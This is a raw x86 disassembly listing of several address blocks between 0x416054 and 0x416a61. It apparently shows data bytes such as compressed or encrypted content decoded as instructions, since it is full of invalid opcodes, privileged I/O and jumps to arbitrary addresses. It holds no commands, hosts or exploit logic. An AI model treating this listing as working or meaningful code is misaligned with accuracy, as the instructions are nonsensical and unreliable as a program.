  416054:	add    BYTE PTR [eax],al
  416056:	pop    ss
  416057:	mov    BYTE PTR [esi-0x6e],ch
  41605a:	push   esi
  41605c:	dec    DWORD PTR [ebp-0x37ca37e8]
  416062:	int    0xc8
  416064:	sub    BYTE PTR [edi+eiz*2],al
  416067:	in     eax,dx
  416068:	add    BYTE PTR [eax],al
  41606a:	add    BYTE PTR [ecx],al
  41606c:	add    BYTE PTR [eax],al
  41606e:	sar    BYTE PTR [ebx-0x57a60479],1
  416074:	xchg   ecx,eax
  416075:	imul   ebp,esp,0xffffffb1
  416078:	xor    al,0x5b
  41607a:	das    
  41607b:	and    esi,edi
  41607d:	push   ebp
  41607e:	add    dl,bl
  416080:	mov    ss:0x42c90305,al
  416086:	call   0x97bedf69
  41608b:	aam    0x63
  41608d:	xchg   BYTE PTR [esi-0x2d67d27b],ah
  416093:	leave  
  416094:	lahf   
  416095:	ins    BYTE PTR es:[edi],dx
  416096:	arpl   bp,ax
  416098:	das    
  416099:	int3   
  41609a:	test   BYTE PTR [eax*4+0x30a7eb1],ah
  4160a1:	mov    al,0xd5
  4160a3:	dec    edi
  4160a4:	lods   eax,DWORD PTR ds:[esi]
  4160a5:	ins    DWORD PTR es:[edi],dx
  4160a6:	sahf   
  4160a7:	jmp    0x416090
  4160a9:	mov    dl,0xe1
  4160ab:	icebp  
  4160ac:	test   eax,0xc3f4c038
  4160b1:	sar    DWORD PTR ds:0x6c9ef58a,1
  4160b7:	inc    esp
  4160b8:	cs cmp esi,DWORD PTR cs:[ebx+ebp*4-0xc]
  4160be:	(bad)  [edx-0x6a]
  4160c1:	ja     0x4160a5
  4160c3:	fwait
  4160c4:	add    BYTE PTR [ebx],al
  4160c6:	push   cs
  4160c7:	push   0xdc603113
  4160cc:	mov    ecx,0xb17108e4
  4160d1:	dec    edi
  4160d2:	ins    DWORD PTR es:[edi],dx
  4160d3:	add    bh,ch
  4160d5:	adc    bl,BYTE PTR [edx+eiz*1]
  4160d8:	repnz or DWORD PTR [eax],eax
  4160db:	retf   0x2136
  4160de:	ins    DWORD PTR es:[edi],dx
  4160df:	pop    es
  4160e0:	rcl    BYTE PTR [edx-0x55a57f5d],0xcf
  4160e7:	movhps QWORD PTR [edx+0x17],xmm6
  4160eb:	leave  
  4160ec:	pop    ecx
  4160ed:	(bad)  
  4160ee:	xchg   edx,eax
  4160ef:	xor    ebp,DWORD PTR [ecx]
  4160f1:	xor    bh,BYTE PTR [ebx-0x19]
  4160f4:	(bad)  [esi+0x79]
  4160f7:	stos   BYTE PTR es:[edi],al
  4160f8:	dec    ecx
  4160f9:	retf   0xde7c
  4160fc:	cwde   
  4160fd:	and    al,0x59
  4160ff:	lahf   
  416100:	rol    BYTE PTR [edx+0x54],1
  416103:	jo     0x416169
  416105:	(bad)
  416108:	mov    dh,0x94
  41610a:	xchg   esi,eax
  41610b:	in     eax,dx
  41610c:	or     ah,BYTE PTR [edi+0x1c]
  41610f:	jnp    0x416128
  416111:	mov    bl,0xdb
  416113:	xchg   esi,eax
  416114:	jnp    0x416111
  416116:	adc    BYTE PTR [esi],bl
  416118:	mov    ah,0x3b
  41611a:	sar    ecx,1
  41611c:	ret    
  41611d:	or     al,0x60
  41611f:	in     al,0x9e
  416121:	lods   al,BYTE PTR ds:[esi]
  416122:	bnd jne 0x41616c
  416125:	arpl   WORD PTR [edi-0x13],si
  416128:	xchg   ecx,eax
  416129:	outs   dx,DWORD PTR ds:[esi]
  41612a:	rol    DWORD PTR [ecx-0x2f],cl
  41612d:	or     al,0x55
  41612f:	push   es
  416130:	jo     0x416189
  416132:	ins    BYTE PTR es:[edi],dx
  416133:	stos   BYTE PTR es:[edi],al
  416134:	jb     0x4160f6
  416136:	ret    0x252
  416139:	les    eax,FWORD PTR [edx-0x6659172c]
  41613f:	push   ebx
  416140:	and    al,0xab
  416142:	cmp    DWORD PTR [ebx-0x47],ebp
  416145:	call   0x2021e1e8
  41614a:	imul   edx,DWORD PTR [edx+0x69fb360a],0xb5af4933
  416154:	xchg   DWORD PTR [esi],esi
  416156:	fistp  DWORD PTR [eax+esi*2-0x74]
  41615a:	jg     0x4161bc
  41615c:	pop    ds
  41615d:	push   es
  41615e:	out    dx,eax
  41615f:	jl     0x416179
  416161:	pushf  
  416162:	lock cli 
  416164:	es loope 0x416199
  416167:	xor    al,bh
  416169:	jmp    0x60351912
	...
  4161d6:	and    cl,ch
  4161d8:	cmp    ebx,esi
  4161da:	sti    
  4161db:	fsubrp st(5),st
  4161dd:	inc    esi
  4161df:	push   edx
  4161e0:	sub    eax,0xffa380f3
  4161e5:	push   esp
  4161e6:	addr16 out dx,al
  4161e8:	add    BYTE PTR [eax],al
  4161ea:	add    BYTE PTR [ecx],al
  4161ec:	add    BYTE PTR [eax],al
  4161ee:	push   ss
  4161ef:	repz pop ebx
  4161f1:	push   edi
  4161f2:	mov    ds:0xf6c78c19,al
  4161f7:	mov    ds:0x92f20583,eax
  4161fc:	xor    edi,DWORD PTR [edx+0x3b]
  4161ff:	pop    ebp
  416200:	add    esi,DWORD PTR [ebx+0x15362bac]
  416206:	pop    edi
  416207:	sahf   
  416208:	inc    edx
  416209:	mov    bh,0x14
  41620b:	out    dx,eax
  41620c:	jb     0x4161f2
  41620e:	or     al,0x5f
  416210:	ins    DWORD PTR es:[edi],dx
  416211:	int3   
  416212:	fucomi st,st(7)
  416214:	jnp    0x416241
  416216:	test   BYTE PTR [ebx+0x708f753b],bl
  41621c:	pop    ss
  41621d:	cmc    
  41621e:	push   edi
  41621f:	lahf   
  416220:	dec    edi
  416221:	mov    ch,0x75
  416223:	xchg   BYTE PTR [ebx],bl
  416225:	fcom   DWORD PTR [eax-0xc]
  416228:	sbb    ecx,ecx
  41622a:	push   ds
  41622b:	cmc    
  41622c:	xchg   esp,eax
  41622d:	std    
  41622e:	repnz and BYTE PTR [eax+0x69],al
  416232:	sub    DWORD PTR [ebx],ebp
  416234:	add    DWORD PTR [edi],esp
  416236:	dec    edi
  416237:	pop    edi
  416238:	and    esi,eax
  41623a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41623b:	jg     0x4161d1
  41623d:	mov    esp,0xe8bee0c3
  416242:	fisttp WORD PTR [ecx]
  416244:	es in  eax,0xf9
  416247:	fdiv   DWORD PTR [edi-0x5687afad]
  41624d:	shr    BYTE PTR [ecx-0x175b68b0],0x8c
  416254:	add    edx,DWORD PTR [eax+0x18]
  416257:	lahf   
  416258:	in     eax,dx
  416259:	fldpi  
  41625b:	ret    0xd99f
  41625e:	in     al,0xa
  416260:	add    eax,0x9e8d59fd
  416265:	push   ebp
  416266:	push   0x73
  416268:	dec    esp
  416269:	pop    ecx
  41626a:	mov    eax,ds:0x703db8c1
  41626f:	pop    edi
  416270:	loope  0x41621b
  416272:	mov    bh,0xac
  416274:	pop    ds
  416275:	loope  0x4162d8
  416277:	pop    esi
  416278:	xlat   BYTE PTR ds:[ebx]
  416279:	loopne 0x416210
  41627b:	pushf  
  41627c:	pop    edx
  41627d:	sti    
  41627e:	pop    ss
  41627f:	mov    al,ds:0xe8e5d816
  416284:	adc    eax,0xee347b09
  416289:	fbstp  TBYTE PTR [edx+0x38]
  41628c:	cdq    
  41628d:	add    esi,DWORD PTR [esi]
  41628f:	sbb    ecx,DWORD PTR [ebp+ebp*1-0x3a6d826e]
  416296:	xor    BYTE PTR [edi+esi*1],ah
  416299:	aam    0x5d
  41629b:	dec    ecx
  41629c:	outs   dx,DWORD PTR ds:[si]
  41629e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41629f:	mov    dl,0x6
  4162a1:	sub    BYTE PTR [ebp-0x16],bh
  4162a4:	repnz div DWORD PTR [eax]
  4162a7:	dec    esi
  4162a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162a9:	aas    
  4162aa:	mov    dh,0x65
  4162ac:	inc    esp
  4162ad:	sbb    edi,ebp
  4162af:	xchg   DWORD PTR [edi-0x6e],ebp
  4162b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162b3:	fmul   QWORD PTR [ebx+0x2fda840e]
  4162b9:	gs pop ecx
  4162bb:	adc    BYTE PTR [esi],al
  4162bd:	call   0x7a:0xbf61a2ba
  4162c4:	jno    0x4162af
  4162c6:	push   ebx
  4162c7:	cli    
  4162c8:	nop
  4162c9:	dec    edi
  4162ca:	xor    DWORD PTR [ebx-0x5b],esp
  4162cd:	dec    ecx
  4162ce:	xor    DWORD PTR [esi-0x6e],esi
  4162d1:	dec    ecx
  4162d2:	mov    esi,0x6efc98be
  4162d7:	mov    bl,BYTE PTR [edi-0x13]
  4162da:	dec    edx
  4162db:	inc    ebx
  4162dc:	adc    BYTE PTR [ebp+eax*4-0x69d8a0b4],bl
  4162e3:	sub    BYTE PTR [ecx+0xe],0x68
  4162e7:	cmp    ebx,eax
  4162e9:	sbb    eax,esi
  4162eb:	arpl   WORD PTR [edi+0x3c],si
	...
  416356:	and    ebp,DWORD PTR [esi+0x32]
  416359:	and    eax,0x6e377d7f
  41635e:	mov    bl,0x5f
  416360:	call   0x67dc:0xada314ee
  416367:	out    dx,eax
  416368:	add    BYTE PTR [eax],al
  41636a:	add    BYTE PTR [ecx],al
  41636c:	add    BYTE PTR [eax],al
  41636e:	pop    eax
  41636f:	fcomi  st,st(0)
  416371:	mov    gs,eax
  416373:	pminub mm5,mm1
  416376:	es int3 
  416378:	dec    esi
  416379:	out    0x49,al
  41637b:	mov    edx,0x55ff2ada
  416380:	outs   dx,DWORD PTR ds:[esi]
  416381:	(bad)  
  416382:	popf   
  416383:	in     al,dx
  416384:	lds    ebp,FWORD PTR [edx+0x5886cb2a]
  41638a:	push   ss
  41638b:	xor    al,0x85
  41638d:	div    bl
  41638f:	iret   
  416390:	mov    eax,ds:0x19e4faf5
  416395:	outs   dx,BYTE PTR ds:[esi]
  416396:	add    DWORD PTR [edx+eax*4-0x7e],edi
  41639a:	mov    bl,0xba
  41639c:	xor    BYTE PTR [ecx+0x38],cl
  41639f:	xor    al,0x3b
  4163a1:	cmc    
  4163a2:	or     bh,BYTE PTR [ebp-0x69958f47]
  4163a8:	out    dx,eax
  4163a9:	div    DWORD PTR ds:0x6b23b7aa
  4163af:	inc    ecx
  4163b0:	jg     0x41636f
  4163b2:	jns    0x41639c
  4163b4:	aas    
  4163b5:	(bad)  
  4163b6:	fadd   QWORD PTR [ecx+0x4f2aead]
  4163bc:	add    al,BYTE PTR [ebp+ebp*2-0x7e2943ac]
  4163c3:	jecxz  0x41639e
  4163c5:	and    edi,ebp
  4163c7:	or     DWORD PTR [edx-0x50],eax
  4163ca:	mov    cl,0x87
  4163cc:	mov    ds:0x8556a611,al
  4163d1:	and    ch,BYTE PTR [ebx+0x2f88f0e0]
  4163d7:	mov    esp,0x75a7766e
  4163dc:	xchg   esi,eax
  4163dd:	retf   0x4058
  4163e0:	loopne 0x41637d
  4163e2:	std    
  4163e3:	and    eax,0x6f7e48c5
  4163e8:	xchg   edx,eax
  4163e9:	push   esp
  4163ea:	adc    eax,ebp
  4163ec:	loopne 0x4163e8
  4163ee:	loope  0x4163e4
  4163f0:	push   eax
  4163f1:	xchg   edi,eax
  4163f2:	inc    esp
  4163f3:	lods   al,BYTE PTR ds:[esi]
  4163f4:	mov    dl,0xba
  4163f6:	in     eax,dx
  4163f7:	mov    ebp,es
  4163f9:	mov    ecx,0x3f4f5740
  4163fe:	in     eax,dx
  4163ff:	fcom   QWORD PTR [esi]
  416401:	les    edx,FWORD PTR [edx+0x31]
  416404:	push   ebx
  416405:	mov    bl,0x87
  416407:	ret    
  416408:	push   esp
  416409:	cwde   
  41640a:	fist   WORD PTR [edx]
  41640c:	mov    ebx,0x14a50474
  416411:	xchg   ebx,eax
  416412:	das    
  416413:	stc    
  416414:	retf   
  416415:	dec    ecx
  416416:	pop    ecx
  416417:	push   ss
  416418:	mov    esi,0x3a3d93cf
  41641d:	xor    ebp,esp
  41641f:	mov    al,ds:0xfdf97cd6
  416424:	loop   0x41644c
  416426:	mov    edi,0x6e8a2160
  41642b:	loope  0x4163f1
  41642d:	sub    bl,BYTE PTR [ebp+eax*1+0x46f88ccb]
  416434:	fs ret 
  416436:	out    0x7d,eax
  416438:	push   ss
  416439:	outs   dx,DWORD PTR ds:[esi]
  41643a:	loop   0x4163f9
  41643c:	in     eax,dx
  41643d:	pop    es
  41643e:	ror    DWORD PTR [eax+0x27ca8605],1
  416444:	mov    edi,0xab0046bb
  416449:	scas   eax,DWORD PTR es:[edi]
  41644a:	pop    eax
  41644b:	jge    0x4164a7
  41644d:	cli    
  41644e:	lds    ebx,FWORD PTR [ebp+0x51b81686]
  416454:	in     eax,0x6
  416456:	call   0xd231115
  41645b:	mov    bh,0xf5
  41645d:	lds    eax,FWORD PTR [esi+eax*2-0x45]
  416461:	dec    ebx
  416462:	pop    eax
  416463:	jg     0x41640d
  416465:	cmp    BYTE PTR [edx+ebp*1-0x33945d50],ah
  41646c:	mov    edx,0x43
	...
  4164d5:	add    bl,dh
  4164d7:	inc    ebx
  4164d8:	ror    cl,1
  4164da:	lock (bad) 
  4164dd:	jnp    0x41646d
  4164df:	xor    al,0x5a
  4164e1:	xchg   esi,eax
  4164e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164e3:	push   ecx
  4164e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164e5:	xor    ah,BYTE PTR [edi-0x10]
  4164e8:	add    BYTE PTR [eax],al
  4164ea:	add    BYTE PTR [ecx],al
  4164ec:	add    BYTE PTR [eax],al
  4164ee:	adc    edi,ebp
  4164f0:	stos   BYTE PTR es:[edi],al
  4164f1:	inc    edx
  4164f2:	dec    edi
  4164f3:	push   ebp
  4164f4:	jmp    0x41650a
  4164f6:	dec    esp
  4164f7:	or     edi,ebp
  4164f9:	xor    ebp,esp
  4164fb:	ret    
  4164fc:	bound  edx,QWORD PTR [edx+0x2b22c9a2]
  416502:	cmp    edi,DWORD PTR [eax-0x34]
  416505:	mov    DWORD PTR [ecx+edi*8],0xa5d3a829
  41650c:	test   eax,0xfd3b77d5
  416511:	clc    
  416512:	add    eax,0x20a41d6a
  416517:	jns    0x4164f1
  416519:	pop    esp
  41651a:	pop    ecx
  41651b:	(bad)  
  41651c:	(bad)  
  41651d:	xor    dh,dh
  41651f:	cdq    
  416520:	push   edi
  416521:	test   BYTE PTR [ebx],0xa0
  416524:	les    eax,FWORD PTR [ebx+0x2e]
  416527:	xchg   esi,eax
  416528:	test   BYTE PTR [edx+0x7e],ah
  41652b:	mov    cl,0xff
  41652d:	inc    edi
  41652e:	or     DWORD PTR [eax],ebp
  416530:	jl     0x416580
  416532:	sub    cl,cl
  416534:	lea    edi,[edi-0x4f]
  416537:	iret   
  416538:	sbb    DWORD PTR [edi-0x28],ecx
  41653b:	cmp    DWORD PTR [ebp-0x849cc85],ecx
  416541:	sbb    cl,BYTE PTR [esi-0x30]
  416544:	cs popa 
  416546:	das    
  416547:	mov    ds:0x54f138b5,eax
  41654c:	cmp    edi,DWORD PTR ds:0xbf607b07
  416552:	sahf   
  416553:	in     al,0x8a
  416555:	ss jp  0x4165aa
  416558:	int3   
  416559:	cld    
  41655a:	sar    al,1
  41655c:	dec    esi
  41655d:	sbb    BYTE PTR [eax+0x7826b730],ch
  416563:	push   cs
  416564:	jne    0x41655b
  416566:	add    esp,eax
  416568:	fwait
  416569:	jecxz  0x41650c
  41656b:	xlat   BYTE PTR ds:[ebx]
  41656c:	xchg   ebp,eax
  41656d:	xor    al,0x9e
  41656f:	inc    esp
  416570:	jle    0x4165a8
  416572:	rcr    DWORD PTR [edi+0x3a2caec4],1
  416578:	sbb    eax,DWORD PTR [edx+0x34]
  41657b:	sar    ch,1
  41657d:	and    DWORD PTR [eax+0x7d],edi
  416580:	lock cmp BYTE PTR [edi+ebx*8-0x72],ch
  416585:	mov    eax,ds:0x48ab0ba8
  41658a:	icebp  
  41658b:	mov    DWORD PTR [edi+0xb],esp
  41658e:	(bad)  
  416590:	repnz ror bl,cl
  416593:	mov    ebx,0xda5a20d4
  416598:	sti    
  416599:	xchg   DWORD PTR [esi],edi
  41659b:	ds scas eax,DWORD PTR es:[edi]
  41659d:	ret    
  41659e:	push   ebx
  41659f:	mov    ebp,0x331f1b67
  4165a4:	pop    ss
  4165a5:	vmovlhps xmm0,xmm4,xmm3
  4165a9:	mov    ah,bl
  4165ab:	lahf   
  4165ac:	inc    esi
  4165ad:	fidivr DWORD PTR [ebp+0xe]
  4165b0:	add    dh,BYTE PTR [eax+0x50ae3beb]
  4165b6:	lea    eax,[edx]
  4165b8:	shr    DWORD PTR ds:0x8dc5ceb5,0xdd
  4165bf:	stos   BYTE PTR es:[edi],al
  4165c0:	add    BYTE PTR [esi],dl
  4165c2:	dec    ebx
  4165c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165c4:	mov    esp,0xe83e656e
  4165c9:	push   edx
  4165ca:	jl     0x416635
  4165cc:	or     BYTE PTR [ebp-0xc],bl
  4165cf:	div    DWORD PTR [ecx-0xa]
  4165d2:	out    dx,eax
  4165d3:	adc    eax,0x6029299c
  4165d8:	rcl    DWORD PTR [ebx-0x1681bcaf],cl
  4165de:	jg     0x41662d
  4165e0:	jge    0x416627
  4165e2:	inc    edx
  4165e3:	mov    ch,0xf4
  4165e5:	lock loope 0x416607
  4165e8:	and    cl,BYTE PTR [ebp+0x33620572]
	...
  416656:	and    eax,0xfff32bd8
  41665b:	repz std 
  41665d:	fisub  WORD PTR [esi-0x6b04354]
  416663:	(bad)  
  416664:	lods   al,BYTE PTR ds:[esi]
  416665:	add    DWORD PTR [edi-0xf],esp
  416668:	add    BYTE PTR [eax],al
  41666a:	add    BYTE PTR [ecx],al
  41666c:	add    BYTE PTR [eax],al
  41666e:	(bad)  
  41666f:	ficomp DWORD PTR [esi]
  416671:	cwde   
  416672:	jl     0x416669
  416674:	adc    esp,edi
  416676:	pop    es
  416677:	stos   DWORD PTR es:[edi],eax
  416678:	mov    ebp,0xbed45453
  41667d:	mov    esp,0xc5150326
  416682:	add    DWORD PTR [edx-0x69],ebx
  416685:	outs   dx,DWORD PTR ds:[esi]
  416686:	push   esi
  416687:	mov    DWORD PTR [edi+eiz*2-0x11201288],eax
  41668e:	lds    esi,FWORD PTR [ebp-0x29cfe6a3]
  416694:	dec    eax
  416695:	mov    bl,BYTE PTR [esi+edi*1+0x4f]
  416699:	in     al,dx
  41669a:	or     al,0xd4
  41669c:	or     bh,dl
  41669e:	call   0xb1bb:0xbb8b69ab
  4166a5:	adc    bh,dh
  4166a7:	mov    DWORD PTR [ebp-0x39],esi
  4166aa:	pop    esp
  4166ab:	mov    ch,0xb
  4166ad:	fisubr DWORD PTR [esp+ebp*1-0x4d51a1c2]
  4166b4:	sub    eax,0x6cd6907b
  4166b9:	cmp    eax,0x20079859
  4166be:	sbb    DWORD PTR [ecx+0x19c7788],eax
  4166c4:	arpl   WORD PTR [ebp+0xd],bx
  4166c7:	add    edi,ecx
  4166c9:	inc    esi
  4166ca:	mov    ebx,0xc7b7857d
  4166cf:	cli    
  4166d0:	shl    DWORD PTR [ecx+0x11739a1e],cl
  4166d6:	push   edx
  4166d7:	fnsave [edx-0x3bd1e0ff]
  4166dd:	or     eax,0xecd1366b
  4166e2:	cs (bad) 
  4166e4:	hlt    
  4166e5:	clc    
  4166e6:	ins    DWORD PTR es:[edi],dx
  4166e7:	imul   edx,DWORD PTR [edx+edi*8],0x69158665
  4166ee:	in     eax,0x17
  4166f0:	push   ds
  4166f1:	gs sub eax,0xa9a2499b
  4166f7:	aaa    
  4166f8:	rcl    DWORD PTR ds:0x77171159,0x65
  4166ff:	ds pop edi
  416701:	pop    eax
  416702:	xchg   ebx,eax
  416703:	stos   DWORD PTR es:[edi],eax
  416704:	pop    edi
  416705:	dec    edx
  416706:	pop    eax
  416707:	daa    
  416708:	inc    esi
  416709:	fadd   DWORD PTR [ebx-0x3a541987]
  41670f:	sti    
  416710:	int3   
  416711:	cdq    
  416712:	sub    al,0x26
  416714:	pop    es
  416715:	or     eax,0xb910144
  41671a:	pusha  
  41671b:	sti    
  41671c:	mov    esi,cs
  41671e:	dec    esi
  41671f:	inc    ecx
  416720:	(bad)  
  416722:	jge    0x416708
  416724:	and    eax,0x9ddf29a1
  416729:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41672a:	addr16 pop ebp
  41672c:	pop    ss
  41672d:	icebp  
  41672e:	in     eax,dx
  41672f:	(bad)  
  416730:	xor    BYTE PTR [esi+0x22e3fcd8],bh
  416736:	inc    esp
  416737:	cmc    
  416738:	fadd   DWORD PTR [esi+0x1970fb0f]
  41673e:	inc    esi
  41673f:	idiv   esp
  416741:	rcr    DWORD PTR ds:[ecx],cl
  416744:	adc    BYTE PTR [ebx],0x41
  416747:	push   esp
  416748:	enter  0x78c3,0x3
  41674c:	test   eax,0xd4461dd
  416751:	les    esi,FWORD PTR [ebx*2-0x7d639dad]
  416758:	fnstenv [eax-0x629df2]
  41675e:	mov    edx,0xb6d88a0e
  416763:	cmc    
  416764:	cli    
  416765:	out    0xf3,al
  416767:	ficom  WORD PTR [ecx+esi*1+0x57d2e6d]
	...
  4167d6:	(bad)  
  4167d7:	(bad)  
  4167d9:	(bad)  
  4167da:	(bad)  
  4167dc:	out    0xff,eax
  4167de:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  4167e2:	add    BYTE PTR [edi+edx*4+0x13],ah
  4167e6:	repnz add BYTE PTR [bx+si],al
  4167ea:	add    BYTE PTR [ecx],al
  4167ec:	add    BYTE PTR [eax],al
  4167ee:	sahf   
  4167ef:	pop    ebp
  4167f0:	(bad)  
  4167f1:	ins    BYTE PTR es:[edi],dx
  4167f2:	rep ins BYTE PTR es:[edi],dx
  4167f4:	mov    al,ds:0x6dbcd25a
  4167f9:	nop
  4167fa:	test   eax,0xb50a1732
  4167ff:	lock push ecx
  416801:	push   es
  416802:	push   0xe453bc28
  416807:	pop    ebp
  416808:	push   ecx
  416809:	add    BYTE PTR [edi+ebx*1+0x3ebd8f1],ch
  416810:	add    ah,dl
  416812:	mov    DWORD PTR [edx+0x6a],esi
  416815:	(bad)  
  416816:	dec    ecx
  416817:	adc    al,0x83
  416819:	int3   
  41681a:	int    0x51
  41681c:	(bad)  
  41681d:	stos   DWORD PTR es:[edi],eax
  41681e:	es add al,0x2b
  416821:	fistp  QWORD PTR [esi]
  416823:	cmp    edx,eax
  416825:	daa    
  416826:	cld    
  416827:	adc    DWORD PTR [edx-0x16d67d],edi
  41682d:	mov    al,ds:0x3d10a1f5
  416832:	pop    esi
  416833:	pop    ebp
  416834:	mov    ch,0xa4
  416836:	dec    esp
  416837:	rol    BYTE PTR es:0x57d251f9,cl
  41683e:	jp     0x4167f9
  416840:	mov    cl,0x4b
  416842:	lds    esi,FWORD PTR [esi]
  416844:	inc    esp
  416845:	shl    BYTE PTR [edx],1
  416847:	add    ch,BYTE PTR [esp+ecx*8]
  41684a:	mov    bh,0x5b
  41684c:	inc    ebx
  41684d:	and    BYTE PTR [esi+0x5f],dh
  416850:	mov    ecx,0xd43acb62
  416855:	int    0x5d
  416857:	in     al,0x18
  416859:	push   edx
  41685a:	fld    QWORD PTR [ebx+0x4a78183d]
  416860:	(bad)  
  416861:	mov    esi,0x6de3b753
  416866:	mov    ecx,DWORD PTR [edx-0x6f552d2]
  41686c:	fwait
  41686d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41686e:	push   edx
  41686f:	jge    0x4168b0
  416871:	cdq    
  416872:	mov    ah,0x48
  416874:	cdq    
  416875:	and    ah,dh
  416877:	call   0x41f9:0x743f1fe6
  41687e:	inc    ecx
  41687f:	and    BYTE PTR [ebx-0x6b],bl
  416882:	enter  0x95a4,0xa6
  416886:	jmp    0x416901
  416888:	shr    cl,0x83
  41688b:	push   esi
  41688c:	jg     0x4168df
  41688e:	cld    
  41688f:	in     eax,dx
  416890:	dec    esi
  416891:	out    dx,eax
  416892:	mov    edi,0xdbbc0f53
  416897:	mov    ds:0x892f6ee4,al
  41689c:	and    DWORD PTR [edi],0x77e49443
  4168a2:	dec    edi
  4168a3:	dec    edi
  4168a4:	js     0x4168bb
  4168a6:	mov    cl,0xea
  4168a8:	jno    0x416846
  4168aa:	fstp   TBYTE PTR [esp+eax*1+0x7358991b]
  4168b1:	adc    edx,eax
  4168b3:	xchg   ecx,eax
  4168b4:	stos   BYTE PTR es:[edi],al
  4168b5:	xchg   ecx,eax
  4168b6:	mov    ah,0x79
  4168b8:	test   eax,0xcd87a6ee
  4168bd:	cmp    DWORD PTR [esi+0xcb896c9],edi
  4168c3:	push   es
  4168c4:	fiadd  WORD PTR [eax-0x63]
  4168c7:	mov    ah,0xe4
  4168c9:	or     al,0x87
  4168cb:	inc    esi
  4168cc:	nop
  4168cd:	xchg   ebp,eax
  4168ce:	mov    al,0xda
  4168d0:	lds    ebx,FWORD PTR [edx]
  4168d2:	es pushf 
  4168d4:	xchg   esi,eax
  4168d5:	imul   ebp,eax,0x57
  4168d8:	xor    al,0xe4
  4168da:	or     bh,ch
  4168dc:	dec    eax
  4168dd:	(bad)  
  4168de:	scas   al,BYTE PTR es:[edi]
  4168df:	sub    DWORD PTR [ecx],ebp
  4168e1:	bound  eax,QWORD PTR cs:[edx+eax*4+0x12]
  4168e6:	push   ss
  4168e7:	xlat   BYTE PTR ds:[ebx]
  4168e8:	hlt    
  4168e9:	fwait
  4168ea:	loope  0x416951
  4168ec:	mov    edx,0xb1
	...
  416955:	add    cl,dl
  416957:	scas   eax,DWORD PTR es:[edi]
  416958:	push   es
  416959:	repz jle 0x416957
  41695c:	cmc    
  41695d:	scas   eax,DWORD PTR es:[edi]
  41695e:	sub    DWORD PTR [edi-0x5d],edi
  416961:	mov    ebp,0xf582508
  416966:	repz add BYTE PTR [bx+si],al
  41696a:	add    BYTE PTR [ecx],al
  41696c:	add    BYTE PTR [eax],al
  41696e:	cld    
  41696f:	inc    esp
  416970:	add    DWORD PTR [ecx+0x29e4ac3],esi
  416976:	sub    BYTE PTR [edx+0x5438b24d],0x23
  41697d:	dec    ebp
  41697e:	or     BYTE PTR [esp+eax*1-0x7bc772bf],0xea
  416986:	mov    edx,0x9a1c5637
  41698b:	mov    esp,0x6fb41875
  416990:	es push es
  416992:	hlt    
  416993:	test   BYTE PTR [ecx],ah
  416995:	xchg   edx,eax
  416996:	scas   eax,DWORD PTR es:[edi]
  416997:	mov    eax,ds:0xc8583516
  41699c:	retf   0x2ce4
  41699f:	and    BYTE PTR [edx+edx*8-0x21],ah
  4169a3:	add    DWORD PTR [esi+0x587980d6],edi
  4169a9:	(bad)  
  4169aa:	stc    
  4169ab:	mov    cl,0x11
  4169ad:	test   esi,edi
  4169af:	jnp    0x416a11
  4169b1:	les    ecx,FWORD PTR ds:0x445aab95
  4169b7:	cli    
  4169b8:	xor    al,cl
  4169ba:	fld    QWORD PTR [edi-0x5106c7d4]
  4169c0:	adc    DWORD PTR [ebp+0x48],0xbb84d99e
  4169c7:	pop    edi
  4169c8:	(bad)  
  4169ca:	loopne 0x416961
  4169cc:	sahf   
  4169cd:	dec    esi
  4169ce:	and    DWORD PTR [ecx+0x5d],edi
  4169d1:	pop    es
  4169d2:	mov    ss,edi
  4169d4:	pop    ss
  4169d5:	mov    ebx,0x80d8d234
  4169da:	push   esp
  4169db:	mov    edi,0x743ed9e0
  4169e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169e1:	inc    eax
  4169e2:	adc    BYTE PTR [edi-0x2a],ah
  4169e5:	mov    ah,BYTE PTR [edx*2-0x1b683381]
  4169ec:	lods   eax,DWORD PTR ds:[esi]
  4169ed:	pop    eax
  4169ee:	out    0x2a,al
  4169f0:	pop    edi
  4169f1:	(bad)  
  4169f2:	loop   0x416a6f
  4169f4:	xor    BYTE PTR [edi],dl
  4169f6:	sbb    DWORD PTR [esi],esp
  4169f8:	mov    dl,0x43
  4169fa:	or     eax,0x8973be10
  4169ff:	mov    edx,0x86e1be06
  416a04:	ins    DWORD PTR es:[edi],dx
  416a05:	push   edi
  416a06:	adc    ecx,eax
  416a08:	pop    esp
  416a09:	or     eax,0x1f4f47b2
  416a0e:	dec    ebx
  416a0f:	jne    0x416a77
  416a11:	push   ecx
  416a12:	pop    es
  416a13:	rcr    BYTE PTR [ecx],cl
  416a15:	pop    eax
  416a16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a17:	outs   dx,DWORD PTR ds:[esi]
  416a18:	loop   0x416a33
  416a1a:	mov    dh,0x18
  416a1c:	push   cs
  416a1d:	inc    ebp
  416a1e:	jg     0x4169f0
  416a20:	lea    ebp,[ebx+0x21]
  416a23:	jbe    0x416a6a
  416a25:	(bad)  
  416a26:	out    dx,al
  416a27:	syscall 
  416a29:	es dec esi
  416a2b:	jne    0x4169ad
  416a2d:	dec    ecx
  416a2e:	pusha  
  416a2f:	imul   ecx,esp,0xffffffc3
  416a32:	push   ds
  416a33:	cmp    esp,DWORD PTR [esi+esi*4+0x4aae3d9f]
  416a3a:	int    0x60
  416a3c:	mov    DWORD PTR ds:0x2ae5fb1f,esp
  416a42:	imul   ecx,DWORD PTR [ecx-0x13558c95],0x89d99b0a
  416a4c:	xor    BYTE PTR [eax],dl
  416a4e:	adc    al,BYTE PTR [edi+0x31]
  416a51:	cmp    ebp,ecx
  416a53:	xchg   edx,eax
  416a54:	add    bl,BYTE PTR [ecx-0x24669d7f]
  416a5a:	das    
  416a5b:	push   edi
  416a5c:	sahf   
  416a5d:	mov    cl,0x53
  416a5f:	or     ecx,eax
  416a61:	sub    ch,BYTE PTR [ebx+0x4774eca7]
